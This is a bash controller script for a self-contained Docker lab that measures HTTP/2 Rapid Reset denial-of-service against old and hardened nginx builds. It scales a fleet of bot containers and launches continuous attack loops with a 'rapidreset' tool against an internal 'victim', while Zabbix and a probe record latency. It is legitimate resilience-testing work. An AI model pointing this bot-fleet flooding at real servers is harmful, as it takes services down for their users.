#!/usr/bin/env bash
# =============================================================================
# control.sh - central, interactive controller for the HTTP/2 Rapid Reset lab.
#
# No GUI, no batch "everything at once". You run it once, get a live console and
# MANUALLY manipulate: choose the server variant, dynamically scale the bot fleet
# up/down, enable/disable the attack - and observe the effect in real time
# (response time in the terminal from the probe + server metrics in Zabbix).
#
# CORE ISOLATION (fixes weird "more bots = less CPU" charts):
#   victim -> cores 0,1   (saturable, degradation visible)
#   probe  -> core 2      (latency measurement NOT starved = reliable)
#   fleet  -> cores 3-11  (pressure, doesn't steal CPU from victim or probe)
#
# BOUNDARY: the fleet consists of pre-built containers of this lab (rapidreset/h2load
# built into the image). The controller orchestrates them - it doesn't deploy anything externally.
#
# Usage:
#   bash scenarios/control.sh            # interactive mode (menu)
#   bash scenarios/control.sh <command>  # single command (for scripts/tests)
#
# Commands (in the menu, type without 'control.sh'):
#   up                      build+deploy the stack (victim+Zabbix+probe), provision Zabbix
#   variant <v>             switch server: old-normal | old-hardened | new-normal | new-hardened
#   scale <N>               set fleet to exactly N bots (dynamically up/down)
#   attack                  launch Rapid Reset on the entire fleet (continuous, until 'stop')
#   legit                   launch h2load traffic (complete requests) instead of attack
#   stop                    stop fleet traffic
#   status                  variant, bot count, victim CPU, last probe measurement
#   probe [N]               show last N (default 12) latency probe measurements
#   zabbix                  print Zabbix link
#   down                    take down the fleet (stack stays); 'down all' takes down everything
#   help                    this help
#   quit                    exit (stack and fleet keep running)
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true
export MSYS2_ARG_CONV_EXCL='*' 2>/dev/null || true

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

FILES=(-f docker-compose.yml -f docker-compose.monitoring.yml -f docker-compose.labvic.yml -f docker-compose.probe.yml)
LABNET="ddos-lab_labnet"
FLEET_IMAGE="lab-fleetbot:latest"
FLEET_CPUSET="3-11"
FLEET_CPUS="${FLEET_CPUS:-0.3}"
ZABBIX_URL="http://localhost:8080"
LIVE_DIR="$ROOT/lab-results/live"
STATE="$LIVE_DIR/.state"
PROBE_CSV="$LIVE_DIR/probe.csv"
mkdir -p "$LIVE_DIR"

C_G='\033[32m'; C_R='\033[31m'; C_Y='\033[33m'; C_B='\033[36m'; C_0='\033[0m'

dc() { docker compose "${FILES[@]}" "$@"; }

state_get() { [ -f "$STATE" ] && grep "^$1=" "$STATE" | tail -1 | cut -d= -f2- || echo ""; }
state_set() {  # key value
  mkdir -p "$LIVE_DIR"
  if [ -f "$STATE" ] && grep -q "^$1=" "$STATE"; then
    sed -i "s|^$1=.*|$1=$2|" "$STATE"
  else
    echo "$1=$2" >> "$STATE"
  fi
}

variant_env() {  # echo "NGINX_OLD VICTIM_MODE" for the variant name
  case "$1" in
    old-normal)   echo "1.25.1-alpine normal"   ;;
    old-hardened) echo "1.25.1-alpine hardened" ;;
    new-normal)   echo "1.27-alpine normal"     ;;
    new-hardened) echo "1.27-alpine hardened"   ;;
    *) return 1 ;;
  esac
}

wait_victim() {
  local i=0
  while [ $i -lt 40 ]; do
    docker run --rm --network "$LABNET" curlimages/curl:8.8.0 -sk --max-time 2 https://victim/ -o /dev/null 2>/dev/null && return 0
    docker exec lab-probe sh -c 'vegeta --version >/dev/null 2>&1' 2>/dev/null
    i=$((i+1)); sleep 1
  done
  return 1
}

# ---------- fleet ----------
fleet_names() { docker ps --filter label=lab-fbot=1 --format '{{.Names}}' 2>/dev/null; }
fleet_count() { fleet_names | grep -c . || true; }
present_idx()  { fleet_names | sed -n 's/^lab-fbot-\([0-9]*\)$/\1/p' | sort -n; }

ensure_fleet_image() {
  docker image inspect "$FLEET_IMAGE" >/dev/null 2>&1 && return 0
  echo "[*] Building fleet image ($FLEET_IMAGE) from ./bot ..."
  docker build -q -t "$FLEET_IMAGE" ./bot >/dev/null
}

create_bot() {
  docker rm -f "lab-fbot-$1" >/dev/null 2>&1
  docker run -d --name "lab-fbot-$1" --label lab-fbot=1 --init \
    --network "$LABNET" --cpuset-cpus "$FLEET_CPUSET" --cpus "$FLEET_CPUS" \
    "$FLEET_IMAGE" >/dev/null
}

_KILL='for d in /proc/[0-9]*; do p=${d#/proc/}; [ "$p" = "1" ] && continue; [ "$p" = "$$" ] && continue; c=$(cat "$d/comm" 2>/dev/null); [ "$c" = "sleep" ] && continue; [ "$c" = "docker-init" ] && continue; kill -9 "$p" 2>/dev/null; done; exit 0'

cmd_scale() {
  local n="${1:-}"
  case "$n" in ''|*[!0-9]*) echo "usage: scale <number>"; return 1 ;; esac
  ensure_fleet_image
  local present; present="$(present_idx)"
  echo "[*] Scaling fleet to $n bots (cpuset $FLEET_CPUSET, $FLEET_CPUS CPU/bot) ..."
  local i
  for i in $(seq 1 "$n"); do
    echo "$present" | grep -qx "$i" || create_bot "$i"
  done
  for i in $present; do
    [ "$i" -gt "$n" ] && docker rm -f "lab-fbot-$i" >/dev/null 2>&1
  done
  local mode; mode="$(state_get attack_mode)"
  echo -e "[*] Fleet: $(fleet_count) bots.$([ -n "$mode" ] && echo " Traffic '$mode' active - arming new bots..." )"
  [ -n "$mode" ] && cmd_fire "$mode"
  return 0
}

cmd_fire() {  # $1 = attack|legit
  local mode="$1"
  local names; names="$(fleet_names)"
  [ -z "$names" ] && { echo "[!] No bots - run 'scale <N>' first"; return 1; }
  local single
  if [ "$mode" = "attack" ]; then
    single='rapidreset -url https://victim:443 -requests 20000 -concurrency 200 -quiet >/dev/null 2>&1'
  else
    single='h2load -n 20000 -c 200 https://victim/ >/dev/null 2>&1'
  fi
  local loop="while true; do $single; done"
  local cid
  for cid in $names; do
    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1
    docker exec -d "$cid" sh -c "$loop"
  done
  state_set attack_mode "$mode"
  echo -e "${C_R}[*] Traffic '$mode' launched on $(echo "$names" | grep -c .) bots (continuous).${C_0} Stop with 'stop'."
}

cmd_stop() {
  local names; names="$(fleet_names)"
  [ -z "$names" ] && { echo "[!] No bots."; return 0; }
  local cid
  for cid in $names; do docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1; done
  state_set attack_mode ""
  echo -e "${C_G}[*] Traffic stopped on all bots.${C_0}"
}

cmd_variant() {
  local v="${1:-}"
  local env; env="$(variant_env "$v")" || { echo "unknown variant: $v (old-normal|old-hardened|new-normal|new-hardened)"; return 1; }
  local ver mode; ver="${env% *}"; mode="${env#* }"
  echo "[*] Switching victim to '$v' (nginx $ver, mode $mode) - rebuilding..."
  NGINX_OLD="$ver" VICTIM_MODE="$mode" VIC_CPUS=2 dc up -d --build --force-recreate victim >/dev/null 2>&1
  state_set variant "$v"
  echo "[*] victim rebuilt. Waiting for HTTP/2..."
  wait_victim && echo -e "${C_G}[*] victim '$v' ready.${C_0}" || echo -e "${C_Y}[!] victim did not respond in time - check 'docker logs lab-victim'.${C_0}"
}

cmd_up() {
  ensure_fleet_image
  local v; v="$(state_get variant)"; [ -z "$v" ] && v="old-normal"
  local env; env="$(variant_env "$v")"; local ver mode; ver="${env% *}"; mode="${env#* }"
  echo "[*] Deploying stack: victim ($v) + Zabbix + probe. First time = build, may take a moment..."
  NGINX_OLD="$ver" VICTIM_MODE="$mode" VIC_CPUS=2 dc up -d --build victim zabbix-db zabbix-server zabbix-web probe
  state_set variant "$v"
  echo "[*] Waiting for victim..."
  wait_victim || echo -e "${C_Y}[!] victim is slow to start - continuing.${C_0}"
  echo "[*] Provisioning Zabbix (host victim + templates)..."
  dc run --rm zabbix-provision 2>&1 | tail -3
  echo -e "${C_G}[*] Done.${C_0} Zabbix: $ZABBIX_URL (Admin/zabbix). Probe in background (docker logs -f lab-probe)."
}

cmd_status() {
  local v bots mode cpu last
  v="$(state_get variant)"; [ -z "$v" ] && v="(not set)"
  bots="$(fleet_count)"
  mode="$(state_get attack_mode)"; [ -z "$mode" ] && mode="idle"
  cpu="$(docker stats --no-stream --format '{{.CPUPerc}}' lab-victim 2>/dev/null || echo '?')"
  echo "-------------------------------------------"
  echo -e " server variant  : ${C_B}$v${C_0}"
  echo -e " bots in fleet   : ${C_B}$bots${C_0}"
  echo -e " fleet traffic   : $([ "$mode" = idle ] && echo "${C_G}$mode${C_0}" || echo "${C_R}$mode${C_0}")"
  echo -e " CPU victim      : ${C_B}$cpu${C_0}  (budget: 2 cores = max 200%)"
  if [ -f "$PROBE_CSV" ]; then
    last="$(tail -1 "$PROBE_CSV")"
    echo " probe (latest)  : $(echo "$last" | awk -F, '{printf "p95=%sms success=%s%% rps=%s @ %s", $4,$7,$8,$2}')"
  else
    echo " probe           : (no data - did 'up' deploy the probe?)"
  fi
  echo "-------------------------------------------"
}

cmd_probe() {
  local n="${1:-12}"
  [ -f "$PROBE_CSV" ] || { echo "missing $PROBE_CSV (deploy the stack: 'up')"; return 1; }
  echo "time     p50     p95      p99      success  rps   (last $n windows)"
  tail -n "$n" "$PROBE_CSV" | awk -F, 'NR>=1{printf "%-8s %-7s %-8s %-8s %-7s%% %-6s\n",$2,$3,$4,$5,$7,$8}'
}

cmd_down() {
  echo "[*] Taking down fleet..."
  docker ps -aq --filter label=lab-fbot=1 | xargs -r docker rm -f >/dev/null 2>&1
  state_set attack_mode ""
  if [ "${1:-}" = "all" ]; then
    echo "[*] Taking down entire stack (victim/Zabbix/probe)..."
    dc down >/dev/null 2>&1
  fi
  echo "[*] Done."
}

dispatch() {
  case "${1:-help}" in
    up)      cmd_up ;;
    variant) cmd_variant "${2:-}" ;;
    scale)   cmd_scale "${2:-}" ;;
    attack)  cmd_fire attack ;;
    legit)   cmd_fire legit ;;
    stop)    cmd_stop ;;
    status)  cmd_status ;;
    probe)   cmd_probe "${2:-12}" ;;
    zabbix)  echo "$ZABBIX_URL  (Admin/zabbix) -> Monitoring -> Latest data -> host victim" ;;
    down)    cmd_down "${2:-}" ;;
    help|'') sed -n '32,50p' "$0" | sed 's/^#\s\?//' ;;
    quit|exit) return 9 ;;
    *) echo "unknown command: $1 (type 'help')" ;;
  esac
}

# --- single-command mode (for tests/scripts) ---
if [ $# -gt 0 ]; then
  dispatch "$@"
  exit $?
fi

# --- interactive mode (menu) ---
echo -e "${C_B}=== Lab HTTP/2 Rapid Reset - controller ===${C_0}"
echo "Type 'up' to deploy the stack, then 'variant', 'scale', 'attack'/'legit', 'stop', 'status'."
echo "Observe: response time in 'status'/'probe' + server metrics in Zabbix ($ZABBIX_URL)."
echo "'help' = full list, 'quit' = exit (stack keeps running)."
cmd_status 2>/dev/null
while true; do
  printf "${C_B}lab>${C_0} "
  read -r a b c || break
  dispatch "$a" "$b" "$c"; rc=$?
  [ "$rc" = "9" ] && { echo "bye (stack and fleet keep running; 'down all' to take down)"; break; }
done
